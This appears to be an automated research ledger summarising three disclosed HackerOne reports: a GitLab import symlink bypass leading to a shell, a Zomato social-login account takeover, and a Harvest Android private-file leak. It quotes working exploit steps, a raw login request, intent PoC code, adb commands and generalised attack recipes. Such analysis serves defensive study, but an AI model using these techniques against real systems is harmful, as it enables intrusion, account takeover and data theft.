ROUTE: live `curl https://hackerone.com/reports/378148.json` — HTTP 200, `visibility: full`, `vulnerability_information` 2,441 B read IN FULL (FIRST route worked — no fallbacks needed). Metadata: GitLab, "Vulnerability in project import leads to arbitrary command execution", weakness Command Injection - Generic, reporter `saltyyolk`, created 2018-07-06, disclosed 2018-08-22, state Closed, 32 votes, user-rated critical.
STATUS: UNVERIFIED (not reproduced — no GitLab host stood up, no tarball crafted, no request sent to any target this pass; every quote below is verbatim from the live `.json` `vulnerability_information` read IN FULL this pass)
CLASS: RCE / command execution — archive-import SYMLINK-FILTER BYPASS (a line-anchored filename except-regex defeated by an embedded newline in the entry name) + DELETE-THEN-RE-IMPORT STATE RETENTION -> arbitrary file write as the GitLab system user -> `authorized_keys` overwrite -> shell (CWE-59 + CWE-434)
CORE METHOD:
  1. THE FILTER (report, verbatim): "code in `file_importer.rb` uses `%r{.*/\.{1,2}$}` to except `.` and `..` in the extracted project import directory tree, and check everything else that does not match this regex and delete all symlinks." — `remove_symlinks!` deletes every extracted symlink EXCEPT entries whose path matches the `.`/`..` keep-regex.
  2. THE BYPASS (report, verbatim): "However, we can easily construct a symlink with the name `.\nevil` in the tarball that matches this regex perfectly. Therefore, it will not be removed by function `remove_symlinks!` in the same file" — a symlink named `.` + NEWLINE + `evil` in the tarball. (Mechanics — labelled ANALYSIS, not a report quote: Ruby `$` is line-anchored and matches before an embedded `\n`, so the first line of the path `uploads/.\nevil` — `uploads/.` — matches `\.{1,2}$` exactly like the `.` entry the regex was written to keep; the sanitizer's keep-list is name-based and newline-blind.)
  3. THE PLACEMENT (report, verbatim): "and finally uploaded to `/var/opt/gitlab/gitlab-rails/uploads/nyangawa/myrepo/.\nevil -> /var/opt/gitlab` (assume we import the project to `nyangawa/myrepo` and the symlink points to `/var/opt/gitlab`)".
  4. THE STATE-RETENTION + RE-IMPORT (report, verbatim): "Gitlab is designed to not delete project upload directory currently. So, the attacker could delete the imported project and then upload another specially crafted Gitlab export to a project with the same name" and "First delete the `nyangawa/myrepo` project we just created. For some reasons the upload directory of this project does not get purged. Then we import another tarball which has, for example, `uploads/.\neviil/.ssh/authorized_keys` in it. And the content of this file is my ssh public key. Then import this tarball to create project `nyangawa/myrepo` again." (report's own typo `neviil` [sic]; the second import COPIES its files through the surviving symlink.)
  5. THE TERMINAL (report, verbatim): "the uploaded `authorized_keys` is copied to `/var/opt/gitlab/gitlab-rails/uploads/nyangawa/myrepo/.\nevil/.ssh/authorized_keys` of the victim's filesystem but unfortunately, this path redirects to `/var/opt/gitlab/.ssh/authorized_keys`. Then I can login to the victim server by ssh with Gitlab's system username." And: "For step 2 and 3, there're some other approaches to get command executed since we can already upload any file to the victim's file system controlled by Gitlab." Impact (verbatim): "An attacker can upload arbitrary file to the victim's file system / Data of other users could be override / An attacker can get a system shell by overwrite specific files."
DETECTION SIGNAL: any archive import/export-restore/upload feature with (a) a symlink SANITIZER written as "delete all symlinks except names matching regex X" where X is line-anchored (`^`/`$`) and entry names are not newline/CR-normalized — tar preserves `\n` in names; (b) a per-object UPLOAD/DATA DIRECTORY that SURVIVES deletion of the object (the platform "is designed to not delete" it) so a re-created object of the SAME name re-enters the old tree; (c) the extraction root sitting inside the service user's own config/home tree (`/var/opt/gitlab/...`). Tell: a symlink named `.`+newline+`x` survives the sanitizer; delete + re-create the object and the old directory persists.
CHAIN: any user who can import a project/group export (precondition: import permission on their own namespace) -> tarball ships a symlink entry named `.`+newline+`evil` (primitive: attacker-authored archive entry names) -> the `remove_symlinks!` keep-regex keeps it (bypass: line-anchored `.{1,2}$` except-list + newline in filename — the first line ends in `/.`) -> symlink materialized in the upload dir pointing at a chosen root `/var/opt/gitlab` (primitive: attacker-planted symlink inside a processed tree) -> DELETE the project; the upload dir is NOT purged (primitive: state retention) -> re-import a second tarball to the same project name whose `uploads/.\nevil/.ssh/authorized_keys` path resolves THROUGH the surviving symlink (primitive: arbitrary file write as the service user) -> the attacker's SSH public key lands at `/var/opt/gitlab/.ssh/authorized_keys` -> `ssh git@host` = shell as the GitLab system user (terminal: RCE on self-hosted GitLab — report impact "get a system shell by overwrite specific files"; other targets reachable by the same write per report "other approaches to get command executed").
TRANSFERABLE TEST: on any import/restore/upload-archive feature: (1) build a tar with an entry that is a SYMLINK named `.`+LF+`x` (also try `..`+LF, bare CR `\r`, and `\r\n` — line-terminated regexes decide differently per engine) pointing at a sensitive root (app config dir, `/etc`); run it past any symlink sanitizer and `ls` the extraction result for a surviving link; (2) check state retention: delete the object, re-create one with the SAME name, and see whether the old upload/data tree is reused; (3) re-import a tarball whose entry paths WALK THROUGH the surviving link (`<name>/.ssh/authorized_keys`, `<name>/config/secrets.yml`, `<name>/cron.d/x`) and confirm where the bytes land (content grep / `ls -l` the resolved path); (4) convert the write to code execution by overwriting a trust anchor in the service user's tree (`authorized_keys`, shell rc, cron, plugin loader). Rule: **a name-based symlink denylist/keep-list is defeated by any character that changes where the regex thinks the line ends — and with one state-retention quirk (upload dir survives deletion), a surviving symlink becomes arbitrary file write, then RCE.**
DEDUPE/DELTA: tokens `378148`, `file_importer`, `remove_symlinks`, `saltyyolk`, `.\nevil`, `%r{.*/\.{1,2}$}` = 0 hits across the three write targets immediately before append. Recorded neighbours REVIEWED and NOT conflated: ledger 2180+ (GitLab bulk-import `uploads.tar.gz` — symlinks survive `untar_zxf` and are FOLLOWED ON LOAD -> arbitrary file READ; different report/mechanism — no filter to bypass, READ terminal); ledger 2644+ (git flag injection: directory name `--output=` makes `git archive` write the tar over `/var/opt/gitlab/.ssh/authorized_keys` -> SSH as `git` — SAME terminal, DIFFERENT primitive: argv/flag injection, no symlink, no import state retention); ledger 2370/2399/2469 (GitLab project-import `project.json` mass-assignment -> issue theft; schema-validator `open-uri` -> file read/SSRF — different mechanisms); ledger 6313+ (`.lgtm.yml` reserved-name twin symlink -> host file READ — reserved-name pair, read terminal); §17.733 logrotten (root-run logrotate race -> root file write — local race, not an import filter). NEW: the line-anchored-filename-regex bypass atom (embedded newline defeats a `$`-anchored keep-list) combined with the delete-then-re-import state-retention WRITE. New general method -> §17.737.
FRESHNESS: created 2018-07-06, disclosed 2018-08-22 — OUTSIDE the preferred 6-12 month window (~8 years) — recorded as BACKFILL, flagged; read because assigned.
HONESTY: not reproduced (no GitLab host stood up, no tarball built, no request sent to any target). SOURCE: https://hackerone.com/reports/202921  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/202921.json` — HTTP 200, `visibility: full`, `vulnerability_information` 2,162 B read IN FULL (FIRST route worked — no fallbacks needed). Metadata: Eternal (team handle `eternal`, hackerone.com/eternal — the Zomato program), "Unauthorised Access to Anyone's User Account", weakness Improper Authentication - Generic, reporter `bhavukjain1`, created 2017-02-02, disclosed 2017-03-28, state Closed/resolved. Reproduction host in the body: `1api.zomato.com` (Zomato mobile app).
STATUS: UNVERIFIED (not reproduced — no request sent to any target this pass)
CLASS: authentication bypass -> ATO — SOCIAL-LOGIN IDENTITY IS CLIENT-ASSERTED: the mobile-BFF login keys the account on a caller-supplied provider id (`fbid`) and never binds it to a server-side verification of the accompanying provider token
CORE METHOD:
  1. THE CALL (report's raw request, verbatim shape, reporter's redactions preserved): `POST /v2/auth.json?presentlat=...&app_version=7.0&...&isFacebook=true&...` on `1api.zomato.com`, headers `X-Zomato-API-Key: ***`, `Content-Type: application/x-www-form-urlencoded`, body `access_token=&client_id=zomato_ios_v2&fb_permission=%5B%22user_friends%22%2C%22email%22%2C%22contact_email%22%2C%22public_profile%22%5D&fb_token=████████&fbdata=%7B...%22id%22%3A%20%22██████████%22...%22email%22%3A%20%22█████████%40yahoo.co.in%22...%7D&fbid=█████` — note `access_token=` is EMPTY in the reporter's own PoC, and `fbdata` is a client-supplied JSON blob.
  2. THE BYPASS (report, verbatim): "In the last parameter, \"fbid\", I just need to replace it with the targeted user's facebook id, and I've been given the access to that user account." / "For eg, just replace the \"fbid\" parameter with ███. You'll gain the access to this user's account." — the account key is the client-supplied `fbid`; nothing verifies that `fb_token`/`fbdata` belong to it.
  3. THE UID SOURCE (report, verbatim): "using my Facebook access token, I'm able to get the correct facebook ids of the people I'm friends on Facebook with and also the ids of second degree friends as well. So I'm able to hack into their Zomato accounts with ease."
DETECTION SIGNAL: social-login / token-exchange endpoints (`/auth.json?isFacebook=true`, `auth/facebook`, `oauth/token`, mobile-BFF `thirdparty*` routes) where the request carries BOTH a provider token AND provider identity fields (fbid/fbdata/openid/sub/user_id) and the account lookup uses the FIELD; a login that succeeds with an empty/garbage token alongside a victim uid; a response echoing the provider uid it keyed on.
CHAIN: attacker's own provider token -> friend-graph enumeration (primitive: the provider API returns friends' and second-degree friends' uids) -> swap `fbid` to the victim's uid in the login POST (primitive: client-asserted account key, no token<->uid binding server-side) -> a session is issued for the victim's account (terminal: ATO of ANY user whose provider uid is known — "Unauthorised Access to Anyone's User Account"; scale = every friend and second-degree friend of the attacker). Per doctrine §8: preconditions = a provider account + the victim's provider uid (friend graph or leak); gain = full account session as the victim.
TRANSFERABLE TEST: on every social-login/token-exchange endpoint, capture one legitimate login and replay three variants: (1) empty/garbage the provider token, keep the uid fields; (2) keep YOUR token, swap `fbid`/`sub`/`openid`/`user_id` to a victim uid; (3) keep the uid, drop the `fbdata`/profile blob. Any variant issuing the victim's session = confirmed ATO. Victim uids come from the provider friend graph, share links (`app_scoped_user_id`), or any uid leak. Rule: **the account key must be derived from the SERVER-SIDE verified token response; a provider uid that arrives in the request body is a client assertion, not an identity.**
DEDUPE/DELTA: tokens `202921`, `fbid`, `fbdata`, `fb_token`, `isFacebook`, `bhavukjain` = 0 technique hits across the three write targets immediately before append. Recorded neighbours REVIEWED and NOT conflated: §17.176 (Nextcloud `user_oidc` ID4me — unverified assertion BUT the attack requires an attacker-controlled ISSUER and a minted `id_token`; here there is no issuer and no crypto at all — the body field IS the identity; different entry point and different test); the token-exchange entry (Bugbountyskills ~23526 — a real provider TOKEN minted for a different APP is accepted (`?type=facebook&access_token=`); there the token's AUDIENCE is wrong, here the token is never bound to the uid at all); §17.285 (BOLA on the account-LINKING endpoint — attacker-chosen account id on the LINK verb, not the LOGIN key); §17.654 (SSO handler validates the challenge SHAPE, never proof); ledger 4705 (social login of an UNVERIFIED e-mail — a different primitive). NEW: the degenerate "the field IS the identity" social-login ATO and the three-variant replay test. New general method -> §17.738.
FRESHNESS: created 2017-02-02, disclosed 2017-03-28 — OUTSIDE the preferred 6-12 month window (~9.7 years) — recorded as BACKFILL, flagged; read because assigned.

Metadata: Harvest (team handle `harvest`), "Possible to steal any protected files on Android", weakness Information Disclosure, reporter `bagipro`, created 2016-08-21, disclosed 2017-02-09, state Closed/resolved.
STATUS: UNVERIFIED (not reproduced — no Android device/lab this pass)
CLASS: internal file read (mobile) — an EXPORTED activity copies a CALLER-SUPPLIED SOURCE URI into world-accessible shared storage without validating the URI = arbitrary private-file exfiltration at any third-party app's request
CORE METHOD:
  1. THE SINK (report, verbatim): "The problem is in exported activity com.harvestapp.app.EditExpenseActivity which accepts URI to a pdf to be processed and saved it on SD Card which is world accessible directory, but in real world it does not validate which file is given, so I can enter any uri and this file will be copied to /sdcard/Android/data/com.harvestapp/files/<current time stamp>.pdf"
  2. THE POC (report's malware-app code, verbatim): `Intent intent = new Intent("android.intent.action.SEND"); intent.setClassName("com.harvestapp", "com.harvestapp.app.EditExpenseActivity"); intent.setType("application/pdf"); intent.putExtra("android.intent.extra.STREAM", Uri.parse("file:///data/data/com.harvestapp/databases/harvest.db")); startActivity(intent);`
  3. THE TERMINAL (report, verbatim): "Here is a PoC of stealing /data/data/com.harvestapp/databases/harvest.db" and "I have found an issue which allows to retrieve any files from /data/data/com.harvestapp/* directory" — the private account database lands world-readable on the SD card.
DETECTION SIGNAL: exported activities (manifest intent-filters / `exported=true`) consuming `EXTRA_STREAM`/data URIs on SEND/VIEW/PICK and COPYING the URI content into external storage (`/sdcard/Android/data/<pkg>/files`, Downloads, DCIM); the handler assumes the URI is a document the USER chose while the CALLER is any app; no resolver-authority check, no path allowlist. Tell: output path is shared storage while the input URI is arbitrary `file://`.
CHAIN: any third-party app on the device (precondition: no special permission — just send an intent) -> the exported activity parses the attacker's `EXTRA_STREAM` URI (primitive: caller-controlled SOURCE uri) -> copies `/data/data/com.harvestapp/...` (any file: `databases/harvest.db`, auth XML, prefs, cookies) to `/sdcard/Android/data/com.harvestapp/files/<timestamp>.pdf` (primitive: write into WORLD-ACCESSIBLE shared storage) -> the third-party app reads the victim's private database (terminal: internal file read of the app's whole private dir, demonstrated on the account DB -> account data/credential theft). Per doctrine §8: preconditions = a malicious app installed alongside the victim app; gain = every file under the app's private data dir.
TRANSFERABLE TEST: for every exported component that consumes a URI: `adb shell am start -n <pkg>/<activity> -a android.intent.action.SEND -t application/pdf --eu android.intent.extra.STREAM "file:///data/data/<pkg>/databases/<db>.db"` (variants: `shared_prefs/<pkg>_preferences.xml`, `app_webview/Cookies`, `files/`), then `adb shell ls /sdcard/Android/data/<pkg>/files/` and pull every new file — grep for tokens/credentials. Rule: **classify every caller-supplied URI in an IPC handler as SOURCE or DESTINATION — a SOURCE URI copied into shared storage is an arbitrary private-file read (a DESTINATION URI is a write traversal).**
DEDUPE/DELTA: tokens `161710`, `harvestapp`, `EditExpenseActivity`, `EXTRA_STREAM`, `bagipro` = 0 technique hits across the three write targets immediately before append. Recorded neighbours REVIEWED and NOT conflated: §17.728 (Reddit #1122177 — an exported deeplink ROUTER with no scheme allowlist hands `file:///data/data/...` to the in-app BROWSER which RENDERS it; same terminal class (mobile internal file read -> token theft) and the family rule "exported component + attacker-chosen `file://` source URI = private file read" is RECORDED there — this entry is recorded as the COPY-SINK DELTA with its own EXTRA_STREAM test and its own detection signal); §17.603 (intent-supplied URI as the DESTINATION file NAME -> write traversal — the opposite URI direction); Basecamp #2553411 (deeplink `filename` traversal writing the app's OWN report to `/sdcard` — destination-name traversal, not an arbitrary source read). NEW: the source-URI copy-to-shared-storage sink on an export/share flow. NO §17 slot (the general family is §17.728).
